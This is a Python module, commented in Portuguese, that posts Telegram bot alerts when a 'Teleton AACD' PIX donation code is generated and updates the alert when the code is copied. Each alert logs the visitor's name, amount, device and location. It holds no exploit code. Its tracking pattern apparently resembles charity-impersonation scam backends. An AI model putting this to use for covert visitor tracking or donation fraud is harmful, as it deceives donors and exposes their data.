"""
Módulo de notificações via Telegram Bot API.
Envia mensagem quando doação é gerada e edita o status quando copiada.
"""
import os
import httpx
from datetime import datetime, timezone, timedelta

BOT_TOKEN = None

def _get_token():
    global BOT_TOKEN
    if BOT_TOKEN is None:
        BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    return BOT_TOKEN

db = None

def set_db(database):
    global db
    db = database


async def _get_token_async():
    """Prioridade: token salvo no DB (via painel) > env var."""
    if db is not None:
        try:
            c = await db.config.find_one({"key": "telegram_bot_token"}, {"_id": 0})
            if c and c.get("value"):
                return c["value"]
        except Exception:
            pass
    return _get_token()


async def _is_enabled():
    if db is None:
        return True
    try:
        c = await db.config.find_one({"key": "telegram_enabled"}, {"_id": 0})
        if c and c.get("value") == "false":
            return False
    except Exception:
        pass
    return True


async def get_chat_id():
    if db is None:
        return None
    config = await db.config.find_one({"key": "telegram_chat_id"}, {"_id": 0})
    if config and config.get("value"):
        return config["value"]
    return None


async def send_message(text: str):
    if not await _is_enabled():
        return None
    token = await _get_token_async()
    if not token:
        return None
    chat_id = await get_chat_id()
    if not chat_id:
        return None
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
                timeout=10,
            )
            data = r.json()
            if data.get("ok"):
                return data["result"]["message_id"]
    except Exception as e:
        print(f"Erro ao enviar Telegram: {e}")
    return None


async def edit_message(message_id: int, text: str):
    if not await _is_enabled():
        return
    token = await _get_token_async()
    if not token:
        return
    chat_id = await get_chat_id()
    if not chat_id:
        return
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"https://api.telegram.org/bot{token}/editMessageText",
                json={"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"},
                timeout=10,
            )
    except Exception as e:
        print(f"Erro ao editar Telegram: {e}")


def _format_now():
    br_time = datetime.now(timezone.utc) - timedelta(hours=3)
    return br_time.strftime("%d/%m/%Y %H:%M:%S")


def _build_message(value, donor_name, status_emoji, status_text, device="", location="", origin=""):
    nome = donor_name if donor_name else "Anônimo"
    data = _format_now()
    device_text = device if device else "-"
    location_text = location if location else "-"
    origin_text = origin if origin else "-"
    return (
        f"\U0001F7E2 <b>NOVO PIX GERADO! (Teleton AACD)</b>\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"\U0001F464 Usuário: {nome}\n"
        f"\U0001F4B0 Valor: <b>R$ {value:,.2f}</b>\n"
        f"\U0001F3E2 Origem: {origin_text}\n"
        f"\U0001F4C5 Data: {data}\n"
        f"\U0001F4F1 Dispositivo: {device_text}\n"
        f"\U0001F4CD Local: {location_text}\n"
        f"\U0001F4CA Status: {status_emoji} {status_text}"
    )


async def notify_donation_created(value: float, donor_name: str, device: str, location: str = "", origin: str = ""):
    text = _build_message(value, donor_name, "\u23F3", "Gerado", device, location, origin)
    message_id = await send_message(text)
    return message_id


async def notify_donation_copied(donation_id: str):
    if db is None:
        return
    donation = await db.donations.find_one({"donation_id": donation_id}, {"_id": 0})
    if not donation or not donation.get("telegram_message_id"):
        return
    text = _build_message(
        donation.get("value", 0),
        donation.get("donor_name", ""),
        "\u2705",
        "Copiado",
        donation.get("device", ""),
        donation.get("location", ""),
        donation.get("origin", "")
    )
    await edit_message(donation["telegram_message_id"], text)
